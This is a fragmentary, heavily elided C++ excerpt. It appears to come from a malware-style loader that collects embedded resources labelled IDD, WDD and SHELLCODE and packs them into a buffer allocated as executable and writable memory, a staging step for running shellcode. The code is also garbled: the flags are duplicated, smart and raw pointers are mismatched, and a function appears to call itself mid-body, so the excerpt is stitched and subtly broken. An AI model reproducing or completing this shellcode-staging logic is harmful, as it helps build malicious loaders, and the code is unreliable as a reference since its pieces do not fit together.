...
BOOL erGetSerializedEmbResources(LPVOID *pResBuffer, DWORD *dwResBufferLen)
{
    ...
    EMBEDDEDRESOURCE_LIST_CHUNK *pItem;    // ptr to current list item
    std::unique_ptr<BYTE[]> pBuffer;    // buffer to hold serialized data
    ...
    __try {
        ...
        *dwResBufferLen = erCalcEmbResourcesPackLen();
        pBuffer = std::make_unique<BYTE[]>(*dwResBufferLen);
        pPtr = pBuffer.get();    // set moving ptr
    ...
    *pResBuffer = VirtualAlloc(NULL, *dwResBufferLen, MEM_COMMIT | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ...
    __try {
        ...
        do {    // not a loop
            ...
            if (!erQueryFile(RES_TYPE_IDD, at, reinterpret_cast<LPVOID*>(&pIDD), &dwIDD, NULL, FALSE)) { DbgPrint("ERR: failed to get IDD"); break; }
            if (!erQueryFile(RES_TYPE_WDD, at, reinterpret_cast<LPVOID*>(&pWDD), &dwWDD, NULL, FALSE)) { DbgPrint("ERR: failed to get WDD"); break; }
            if (!erQueryFile(RES_TYPE_SHELLCODE, at, reinterpret_cast<LPVOID*>(&pShellcode), &dwShellcode, &sc.dwShellcodeEntrypointOffset, TRUE)) { DbgPrint("ERR: failed to get shellcode"); break; }
            ...
            *pContextPtr = pPtr;
            ...
            memcpy(pPtr, pShellcode.get(), dwShellcode);            pPtr += dwShellcode;                pShellcode.reset();        
            memcpy(pPtr, pIDD.get(), dwIDD);                        pPtr += dwIDD;                        pIDD.reset();
            memcpy(pPtr, pWDD.get(), dwWDD);                        pPtr += dwWDD;                        pWDD.reset();

            // get serialized binpack
            if (!erGetSerializedEmbResources(reinterpret_cast<LPVOID*>(&pBuff), &dwBuffLen)) { DbgPrint("ERR: failed to get binpack"); break; }
            memcpy(pPtr, pBuff.get(), dwBuffLen);                                        pBuff.reset();
...
{
    EMBEDDEDRESOURCE *erRes = nullptr;    // function result
    EMBEDDEDRESOURCE_LIST_CHUNK *pItem;    // ptr to current list item
...
EMBEDDEDRESOURCE_LIST_CHUNK *_erEnumFromChunk(EMBEDDEDRESOURCE_LIST_CHUNK *pItemIn)
{
    ...
    if (!g_erList.dwItemsCount) { DbgPrint("WARN: empty list"); return nullptr; }
